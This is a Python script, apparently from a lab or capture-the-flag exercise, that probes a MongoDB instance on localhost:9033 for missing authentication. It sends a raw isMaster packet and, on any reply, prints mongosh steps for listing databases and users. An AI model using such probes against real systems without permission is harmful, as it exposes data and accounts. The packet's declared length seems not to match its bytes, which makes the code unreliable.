#!/usr/bin/env python3
"""
Machine 3 - MongoDB Unauthenticated Access
Target: localhost:9033
Vulnerability: No authentication required
"""

import socket
import struct
import sys

TARGET = "localhost"
PORT = 9033

def exploit():
    """Connect to MongoDB without authentication and list databases"""
    try:
        # Simple MongoDB wire protocol to list databases
        # Using raw socket since pymongo may not be available
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((TARGET, PORT))
        
        # MongoDB isMaster command
        # This is a simplified check - full exploitation would require pymongo
        is_master = b'\x3f\x00\x00\x00' + \
                    b'\x01\x00\x00\x00' + \
                    b'\x00\x00\x00\x00' + \
                    b'\xd4\x07\x00\x00' + \
                    b'\x00\x00\x00\x00' + \
                    b'admin.$cmd\x00' + \
                    b'\x00\x00\x00\x00' + \
                    b'\x01\x00\x00\x00' + \
                    b'\x13\x00\x00\x00\x10isMaster\x00\x01\x00\x00\x00\x00'
        
        sock.send(is_master)
        response = sock.recv(4096)
        
        if response:
            print("[+] MongoDB is accessible without authentication!")
            print(f"[+] Received {len(response)} bytes response")
            print("-" * 50)
            print("[*] To fully exploit, use: mongosh localhost:9033")
            print("[*] Commands:")
            print("    show dbs")
            print("    use admin")
            print("    db.getUsers()")
            return True
        
        sock.close()
        
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

def main():
    print("[*] Machine 3 - MongoDB Unauthenticated Access")
    print(f"[*] Target: {TARGET}:{PORT}")
    print("-" * 50)
    
    exploit()

if __name__ == "__main__":
    main()
